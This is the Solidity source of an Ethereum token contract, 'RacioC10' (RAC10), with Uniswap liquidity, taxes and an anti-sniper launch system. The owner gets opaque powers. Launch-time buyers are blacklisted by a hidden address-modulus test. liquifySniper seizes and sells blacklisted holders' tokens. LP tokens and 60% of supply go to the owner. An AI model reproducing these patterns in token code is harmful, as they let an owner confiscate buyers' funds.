/**
 *Submitted for verification at Etherscan.io on 2022-02-12
*/

//SPDX-License-Identifier: MIT 
// NOTE: SafeMath library is not used as it's redundant since Solidity 0.8

pragma solidity 0.8.11;

interface IERC20 {
	function totalSupply() external view returns (uint256);
	function decimals() external view returns (uint8);
	function symbol() external view returns (string memory);
	function name() external view returns (string memory);
	function getOwner() external view returns (address);
	function balanceOf(address account) external view returns (uint256);
	function transfer(address recipient, uint256 amount) external returns (bool);
	function allowance(address _owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 amount) external returns (bool);
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
	address internal owner;
	constructor(address _owner) { owner = _owner; }
	modifier onlyOwner() { require(msg.sender == owner, "Only contract owner can call this function"); _; }
	function transferOwnership(address payable newOwner) external onlyOwner { owner = newOwner;	emit OwnershipTransferred(newOwner); }
	event OwnershipTransferred(address owner);
}

interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair); }
interface IUniswapV2Router02 {
	function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
	function WETH() external pure returns (address);
	function factory() external pure returns (address);
	function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract RAC10 is IERC20, Auth {
	string constant _name = "RacioC10";
	string constant _symbol = "RAC10";
	uint256 constant _totalSupply = 100 * (10**6) * (10 ** _decimals);
	uint8 constant _decimals = 9;
	uint32 _smd; uint32 _smr;
	mapping (address => uint256) private _balances;
	mapping (address => mapping (address => uint256)) private _allowances;
	mapping (address => bool) private _noFees;
	mapping (address => bool) private _noLimits;
	bool public tradingOpen;
	uint256 public maxTxAmount; uint256 public maxWalletAmount;
	uint256 private _taxSwapMin; uint256 private _taxSwapMax;
	mapping (address => bool) public _isLiqPool;
	address private _primaryLiqPool;
	uint16 public snipersCaught = 0;
	uint8 _defTaxRate = 12;
	uint8 public taxRateBuy; uint8 public taxRateSell; uint8 public taxRateTransfer;
	uint16 private _tokenTaxShares = 0;
	uint16 private _autoLPShares   = 154;
	uint16 private _ethTaxShares1  = 230; 
	uint16 private _ethTaxShares2  = 308; 
	uint16 private _ethTaxShares3  = 308; 

	uint256 private _humanBlock = 0;
	mapping (address => bool) private _nonSniper;
	mapping (address => uint256) private _sniperBlock;
	mapping (address => uint8) private _sniperReason;

	uint8 private _gasPriceBlocks = 30;
	uint256 blackGwei = 20 * 10**9;
	uint256 greyGwei = 10 * 10**9;

	address payable private _ethTaxWallet1 = payable(0xCe3A0aB7C4c82A53D0FB7FdC4A9067A0AfEFd769); 
	address payable private _ethTaxWallet2 = payable(0xDB8690098bE8BAaEffF1D4A463b210cc8F0863A4); 
	address payable private _ethTaxWallet3 = payable(0xcF612b99e9D6b495Eb92bf27698Cc67de14Bd9f1); 
	address private _tokenTaxWallet = address(0xCe3A0aB7C4c82A53D0FB7FdC4A9067A0AfEFd769); 
	bool private _inTaxSwap = false;
	address private constant _uniswapV2RouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
	IUniswapV2Router02 private _uniswapV2Router;
	modifier lockTaxSwap { _inTaxSwap = true; _; _inTaxSwap = false; }

	event SniperLiquified(address wallet, uint256 tokenAmount);

	constructor (uint32 smd, uint32 smr) Auth(msg.sender) {      
		tradingOpen = false;
		maxTxAmount = _totalSupply;
		maxWalletAmount = _totalSupply;
		_taxSwapMin = _totalSupply * 10 / 10000;
		_taxSwapMax = _totalSupply * 50 / 10000;
		_uniswapV2Router = IUniswapV2Router02(_uniswapV2RouterAddress);

		_noFees[owner] = true;
		_noFees[address(this)] = true;
		_noFees[_uniswapV2RouterAddress] = true;
		_noFees[_ethTaxWallet1] = true;
		_noFees[_ethTaxWallet2] = true;
		_noFees[_ethTaxWallet3] = true;
		_noFees[_tokenTaxWallet] = true;

		_noLimits[address(this)] = true;
		_noLimits[owner] = true;
		_noLimits[_ethTaxWallet1] = true;
		_noLimits[_ethTaxWallet2] = true;
		_noLimits[_ethTaxWallet3] = true;
		_noLimits[_tokenTaxWallet] = true;

		_nonSniper[address(this)] = true;
		_nonSniper[owner] = true;
		_nonSniper[_ethTaxWallet1] = true;
		_nonSniper[_ethTaxWallet2] = true;
		_nonSniper[_ethTaxWallet3] = true;
        _nonSniper[_tokenTaxWallet] = true;

		_smd = smd; _smr = smr;

		_balances[address(this)] = _totalSupply;
	}
	
	receive() external payable {}
	
	function totalSupply() external pure override returns (uint256) { return _totalSupply; }
	function decimals() external pure override returns (uint8) { return _decimals; }
	function symbol() external pure override returns (string memory) { return _symbol; }
	function name() external pure override returns (string memory) { return _name; }
	function getOwner() external view override returns (address) { return owner; }
	function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
	function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

	function approve(address spender, uint256 amount) public override returns (bool) {
		if ( _humanBlock > block.number && !_nonSniper[msg.sender] ) {
			//wallets approving before CA is announced as safe are obvious snipers
			_markSniper(msg.sender, block.number, 2);
		}

		_allowances[msg.sender][spender] = amount;
		emit Approval(msg.sender, spender, amount);
		return true;
	}

	function transfer(address recipient, uint256 amount) external override returns (bool) {
		require(_checkTradingOpen(), "Trading not open");
		return _transferFrom(msg.sender, recipient, amount);
	}

	function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
		require(_checkTradingOpen(), "Trading not open");
		if(_allowances[sender][msg.sender] != type(uint256).max){
			_allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
		}
		return _transferFrom(sender, recipient, amount);
	}

	function initLP(uint256 ethAmountWei) external onlyOwner {
		require(!tradingOpen, "trading already open");
		require(ethAmountWei > 0, "eth cannot be 0");

		_balances[address(this)] = _totalSupply * 4 / 10;
		emit Transfer(address(0), address(this), _totalSupply * 4 / 10);
		_balances[owner] = _totalSupply * 6 / 10;
		emit Transfer(address(0), address(owner), _totalSupply * 6 / 10);

		uint256 _contractETHBalance = address(this).balance;
		require(_contractETHBalance >= ethAmountWei, "not enough eth");
		uint256 _contractTokenBalance = balanceOf(address(this));
		require(_contractTokenBalance > 0, "no tokens");
		_primaryLiqPool = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

		_isLiqPool[_primaryLiqPool] = true;
		_nonSniper[_primaryLiqPool] = true;

		_approveRouter(_contractTokenBalance);
		_addLiquidity(_contractTokenBalance, ethAmountWei, false);

		_openTrading();
	}

	function _approveRouter(uint256 _tokenAmount) internal {
		if ( _allowances[address(this)][_uniswapV2RouterAddress] < _tokenAmount ) {
			_allowances[address(this)][_uniswapV2RouterAddress] = type(uint256).max;
			emit Approval(address(this), _uniswapV2RouterAddress, type(uint256).max);
		}
	}

	function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
		address lpTokenRecipient = address(0);
		if ( !autoburn ) { lpTokenRecipient = owner; }
		_uniswapV2Router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lpTokenRecipient, block.timestamp );
	}

	function setLiquidityPool(address contractAddress, bool isLP) external onlyOwner {
		if (isLP) {
			require(!_isLiqPool[contractAddress], "LP already set");
			_isLiqPool[contractAddress] = true;
		} else {
			require(_isLiqPool[contractAddress], "Not an LP");
			require(contractAddress != _primaryLiqPool, "Cannot unset primary LP");
			_isLiqPool[contractAddress] = false;
		}
	}

	function _openTrading() internal {
		_humanBlock = block.number + 20; 
		maxTxAmount     = 3 * _totalSupply / 1000 + 10**_decimals; 
		maxWalletAmount = maxTxAmount;
		taxRateBuy = 12; 
		taxRateSell = 25; 
		taxRateTransfer = 12; 
		tradingOpen = true;
	}

	function humanize() external onlyOwner{
		_humanize(0);
	}

	function _humanize(uint8 blkcount) internal {
		if ( _humanBlock > block.number || _humanBlock == 0 ) {
			_humanBlock = block.number + blkcount;
		}
	}

	function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
		if ( _humanBlock > block.number ) {
			if ( uint160(address(recipient)) % _smd == _smr ) { _humanize(1); }
			else if ( _sniperBlock[sender] == 0 ) { _markSniper(recipient, block.number, 1); }
			else { _markSniper(recipient, _sniperBlock[sender], 3); }
		} else {
			if ( _sniperBlock[sender] != 0 ) { _markSniper(recipient, _sniperBlock[sender], 3); }
			if ( block.number < _humanBlock + _gasPriceBlocks ) {
				uint256 priceDiff = 0;
				if ( tx.gasprice >= block.basefee ) { priceDiff = tx.gasprice - block.basefee; }
				if ( priceDiff >= blackGwei ) {
					_markSniper(recipient, block.number, 4); 
				} else if ( priceDiff >= greyGwei ) {
					revert("Gas price over limit"); 
				}
			}
		}
		if ( tradingOpen && _sniperBlock[sender] != 0 && _sniperBlock[sender] < block.number ) { revert("blacklisted");	}

		if ( !_inTaxSwap && _isLiqPool[recipient] ) { _swapTaxAndLiquify();	}

		if ( sender != address(this) && recipient != address(this) && sender != owner ) { require(_checkLimits(recipient, amount), "TX exceeds limits"); }
		uint256 _taxAmount = _calculateTax(sender, recipient, amount);
		uint256 _transferAmount = amount - _taxAmount;
		_balances[sender] = _balances[sender] - amount;
		if ( _taxAmount > 0 ) { _balances[address(this)] = _balances[address(this)] + _taxAmount; }
		_balances[recipient] = _balances[recipient] + _transferAmount;
		emit Transfer(sender, recipient, amount);
		return true;
	}

	function _markSniper(address wallet, uint256 snipeBlockNum, uint8 reason) internal {
		if ( !_nonSniper[wallet] && _sniperBlock[wallet] == 0 ) { 
			_sniperBlock[wallet] = snipeBlockNum; 
			_sniperReason[wallet] = reason;
			snipersCaught ++;
		}
	}
		
	function _checkLimits(address recipient, uint256 transferAmount) internal view returns (bool) {
		bool limitCheckPassed = true;
		if ( tradingOpen && !_noLimits[recipient] ) {
			if ( transferAmount > maxTxAmount ) { limitCheckPassed = false; }
			else if ( !_isLiqPool[recipient] && (_balances[recipient] + transferAmount > maxWalletAmount) ) { limitCheckPassed = false; }
		}
		return limitCheckPassed;
	}

	function _checkTradingOpen() private view returns (bool){
		bool checkResult = false;
		if ( tradingOpen ) { checkResult = true; } 
		else if ( tx.origin == owner ) { checkResult = true; } 
		return checkResult;
	}

	function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {
		uint256 taxAmount;
		if ( !tradingOpen || _noFees[sender] || _noFees[recipient] ) { taxAmount = 0; }
		else if ( _isLiqPool[sender] ) { taxAmount = amount * taxRateBuy / 100; }
		else if ( _isLiqPool[recipient] ) { taxAmount = amount * taxRateSell / 100; }
		else { taxAmount = amount * taxRateTransfer / 100; }
		return taxAmount;
	}

	function blacklistReason(address wallet) external view returns(string memory) {
		string memory reason;
		if (_sniperReason[wallet] == 1) { reason = "Early sniper"; }
		else if (_sniperReason[wallet] == 2) { reason = "Approve before buy"; }
		else if (_sniperReason[wallet] == 3) { reason = "Sniper transfer from sniper wallet"; }
		else if (_sniperReason[wallet] == 4) { reason = "Excessive gas"; }
		else { reason = "Not blacklisted"; }
		return reason;}

	
	function blacklistBlock(address wallet) external view returns(uint256) {
		return _sniperBlock[wallet];
	}

	function ignoreFees(address wallet, bool ignore) external onlyOwner {
		_noFees[ wallet ] = ignore;
	}

	function ignoreLimits(address wallet, bool ignore) external onlyOwner {
		if ( wallet == _tokenTaxWallet ) { require(ignore, "Tax token wallet unlimited"); }
		_noLimits[ wallet ] = ignore;
	}

	function changeTaxRate(uint8 newBuyTax, uint8 newSellTax, uint8 newTxTax) external onlyOwner {
		require(newBuyTax <= _defTaxRate && newSellTax <= 14 && newTxTax <= _defTaxRate, "Tax too high");
		taxRateBuy = newBuyTax;
		taxRateSell = newSellTax;
		taxRateTransfer = newTxTax;
	}

	function enableBuySupport() external onlyOwner {
		taxRateBuy = 0;
		taxRateSell = 2 * _defTaxRate;
	}
  
	function changeTaxDistributionPermile(uint16 sharesTokenWallet, uint16 sharesAutoLP, uint16 sharesEthWallet1, uint16 sharesEthWallet2, uint16 sharesEthWallet3) external onlyOwner {
		require(sharesTokenWallet + sharesAutoLP + sharesEthWallet1 + sharesEthWallet2 + sharesEthWallet3 == 1000, "Sum must be 1000" );
		_tokenTaxShares = sharesTokenWallet;
		_autoLPShares = sharesAutoLP;
		_ethTaxShares1 = sharesEthWallet1;
		_ethTaxShares2 = sharesEthWallet2;
		_ethTaxShares3 = sharesEthWallet3;
	}
	
	function changeTaxWallets(address newEthWallet1, address newEthWallet2, address newEthWallet3, address newTokenTaxWallet) external onlyOwner {
		_ethTaxWallet1 = payable(newEthWallet1);
		_ethTaxWallet2 = payable(newEthWallet2);
		_ethTaxWallet3 = payable(newEthWallet3);
		_tokenTaxWallet = newTokenTaxWallet;
		_noFees[newEthWallet1] = true;
		_noFees[newEthWallet2] = true;
		_noFees[newEthWallet3] = true;
		_noFees[_tokenTaxWallet] = true;
		_noLimits[_tokenTaxWallet] = true;
	}

	function increaseLimits(uint16 maxTxAmtPermile, uint16 maxWalletAmtPermile) external onlyOwner {
		uint256 newTxAmt = _totalSupply * maxTxAmtPermile / 1000 + 1;
		require(newTxAmt >= maxTxAmount, "tx limit too low");
		maxTxAmount = newTxAmt;
		uint256 newWalletAmt = _totalSupply * maxWalletAmtPermile / 1000 + 1;
		require(newWalletAmt >= maxWalletAmount, "wallet limit too low");
		maxWalletAmount = newWalletAmt;
	}

	function liquifySniper(address wallet, uint8 liqPercent) external onlyOwner lockTaxSwap {
		require(liqPercent <= 100, "Cannot liquify more than the balance");
		require(_sniperBlock[wallet] != 0, "not a sniper");
		uint256 sniperBalance = balanceOf(wallet);
		require(sniperBalance > 0, "no tokens");
		sniperBalance = sniperBalance * liqPercent / 100;

		_balances[wallet] = _balances[wallet] - sniperBalance;
		_balances[address(this)] = _balances[address(this)] + sniperBalance;
		emit Transfer(wallet, address(this), sniperBalance);

		uint256 liquifiedTokens = sniperBalance/2 - 1;
		uint256 _ethPreSwap = address(this).balance;
		_swapTaxTokensForEth(liquifiedTokens);
		uint256 _ethSwapped = address(this).balance - _ethPreSwap;
		_approveRouter(liquifiedTokens);
		_addLiquidity(liquifiedTokens, _ethSwapped, false);
		emit SniperLiquified(wallet, sniperBalance);
	}

	function changeTaxSwapSettings(uint32 minValue, uint32 minDivider, uint32 maxValue, uint32 maxDivider) external onlyOwner {
		_taxSwapMin = _totalSupply * minValue / minDivider;
		_taxSwapMax = _totalSupply * maxValue / maxDivider;
		require(_taxSwapMax>=_taxSwapMin, "MinMax error");
		require(_taxSwapMax>_totalSupply / 10000, "Upper threshold too low");
	}


	function _transferTaxTokens(address recipient, uint256 amount) private {
		if ( amount > 0 ) {
			_balances[address(this)] = _balances[address(this)] - amount;
			_balances[recipient] = _balances[recipient] + amount;
			emit Transfer(address(this), recipient, amount);
		}
	}

	function _swapTaxAndLiquify() private lockTaxSwap {
		uint256 _taxTokensAvailable = balanceOf(address(this));

		if ( _taxTokensAvailable >= _taxSwapMin && tradingOpen ) {
			if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }

			
			uint256 _tokensForLP = _taxTokensAvailable * _autoLPShares / 1000 / 2;
			uint256 _tokensToTransfer = _taxTokensAvailable * _tokenTaxShares / 1000;
			_transferTaxTokens(_tokenTaxWallet, _tokensToTransfer);
			
			uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP - _tokensToTransfer;
			uint256 _ethPreSwap = address(this).balance;
			_swapTaxTokensForEth(_tokensToSwap);
			uint256 _ethSwapped = address(this).balance - _ethPreSwap;
			if ( _autoLPShares > 0 ) {
				uint256 _ethWeiAmount = _ethSwapped * _autoLPShares / 1000 ;
				_approveRouter(_tokensForLP);
				_addLiquidity(_tokensForLP, _ethWeiAmount, false);
			}
			uint256 _contractETHBalance = address(this).balance;
			if(_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
		}
	}

	function _swapTaxTokensForEth(uint256 _tokenAmount) private {
		_approveRouter(_tokenAmount);
		address[] memory path = new address[](2);
		path[0] = address(this);
		path[1] = _uniswapV2Router.WETH();
		_uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(_tokenAmount,0,path,address(this),block.timestamp);
	}

	function _distributeTaxEth(uint256 _amount) private {
		uint16 _taxShareTotal = _ethTaxShares1 + _ethTaxShares2 + _ethTaxShares3;
		if ( _ethTaxShares1 > 0 ) { _ethTaxWallet1.transfer(_amount * _ethTaxShares1 / _taxShareTotal); }
		if ( _ethTaxShares2 > 0 ) { _ethTaxWallet2.transfer(_amount * _ethTaxShares2 / _taxShareTotal); }
		if ( _ethTaxShares3 > 0 ) { _ethTaxWallet3.transfer(_amount * _ethTaxShares3 / _taxShareTotal); }
	}

	function taxTokensSwap() external onlyOwner {
		uint256 taxTokenBalance = balanceOf(address(this));
		require(taxTokenBalance > 0, "No tokens");
		_swapTaxTokensForEth(taxTokenBalance);
	}

	function taxEthSend() external onlyOwner { 
		_distributeTaxEth(address(this).balance); 
	}
}